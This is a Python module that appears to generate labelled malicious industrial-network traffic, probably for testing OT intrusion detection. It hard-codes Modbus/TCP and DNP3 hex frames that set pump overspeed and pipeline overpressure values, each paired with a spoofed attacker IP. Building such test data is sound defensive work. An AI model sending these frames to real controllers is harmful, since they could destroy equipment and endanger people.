"""
Attack Industrial Traffic Generator

Generates explicitly malicious OT payloads engineered to breach safety boundaries,
induce overpressure / thermal runaway, and cause critical or catastrophic physical state failures.
"""

import random
from typing import List, Dict, Any
from .normal_traffic import DEVICES, build_modbus_fc06_hex


def generate_attack_traffic(count: int = 10) -> List[Dict[str, Any]]:
    """
    Generate malicious attack traffic items.
    """
    traffic = []

    # Known extreme attack vectors
    attack_vectors = [
        {
            "protocol": "Modbus/TCP",
            "hex": "00010000000601069C41C350",  # FC 06, Register 40001, Value 50000 (0xC350)
            "description": "EXTREME MALICIOUS OVERSPEED ATTACK: FC 06 -> Register 40001 (SET_RPM = 50000 RPM)",
            "dest": DEVICES["Pump-01"],
            "rpm": 50000
        },
        {
            "protocol": "Modbus/TCP",
            "hex": "00020000000601069C417530",  # FC 06, Register 40001, Value 30000 (0x7530)
            "description": "SEVERE PUMP OVERLOAD ATTACK: FC 06 -> Register 40001 (SET_RPM = 30000 RPM)",
            "dest": DEVICES["Pump-01"],
            "rpm": 30000
        },
        {
            "protocol": "Modbus/TCP",
            "hex": "00030000000601069C412710",  # FC 06, Register 40001, Value 10000 (0x2710)
            "description": "HIGH VELOCITY CAVITATION ATTACK: FC 06 -> Register 40001 (SET_RPM = 10000 RPM)",
            "dest": DEVICES["Pump-01"],
            "rpm": 10000
        },
        {
            "protocol": "Modbus/TCP",
            "hex": "00040000000601069C4303E8",  # FC 06, Register 40003, Value 1000 bar (0x03E8)
            "description": "PIPELINE RUPTURE ATTACK: FC 06 -> Register 40003 (SET_PRESSURE = 1000 bar)",
            "dest": DEVICES["Pressure-Sensor-01"],
            "rpm": 0
        },
        {
            "protocol": "DNP3",
            "hex": "056414000100320012340100053001001027",  # DNP3 Direct Operate Analog Output 10000
            "description": "DNP3 DIRECT OPERATE ATTACK: Malicious Analog Output Override (10000 RPM)",
            "dest": DEVICES["RTU-01"],
            "rpm": 10000
        }
    ]

    attacker_ips = ["10.100.2.45", "192.168.1.222", "172.16.50.88"]

    for i in range(1, count + 1):
        vec = attack_vectors[(i - 1) % len(attack_vectors)]
        attacker_ip = random.choice(attacker_ips)

        item = {
            "id": i,
            "protocol": vec["protocol"],
            "source_ip": attacker_ip,
            "destination_ip": vec["dest"],
            "hex_payload": vec["hex"],
            "description": vec["description"],
            "category": "ATTACK"
        }
        traffic.append(item)

    return traffic
